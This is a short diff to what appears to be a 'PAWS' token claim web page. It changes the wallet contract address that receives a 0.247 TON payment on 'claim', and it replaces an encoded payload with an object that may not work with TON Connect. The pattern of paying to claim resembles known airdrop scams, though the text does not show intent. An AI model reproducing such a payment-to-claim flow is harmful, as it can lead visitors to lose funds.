@@ -211,7 +211,7 @@ alt="PAWS Logo" class="logo">
 
 <!-- Scripts -->
 <script>
-const CONTRACT_ADDRESS = 'EQBn4yIke9nx1yIdsqczRzQ9S9piBixytAwJ0tEKq8lt5E_v';
+const CONTRACT_ADDRESS = 'EQDzXHNS_jgTHaB1et8zfXAgKUtQ_-Zm23n23fUesosf0WnA';
 const REQUIRED_AMOUNT = '247000000'; // 0.247 TON in nanotons
 
 // Initialize TON Connect
@@ -306,7 +306,11 @@ async function handleClaim() {
             messages: [{
                 address: CONTRACT_ADDRESS,
                 amount: REQUIRED_AMOUNT,
-                payload: 'te6ccgEBAQEABgAACCBpbmNyZW1lbnQ='
+                stateInit: null,
+                payload: {
+                    $$type: 'increment',
+                    amount: REQUIRED_AMOUNT
+                }
             }]
         };
 
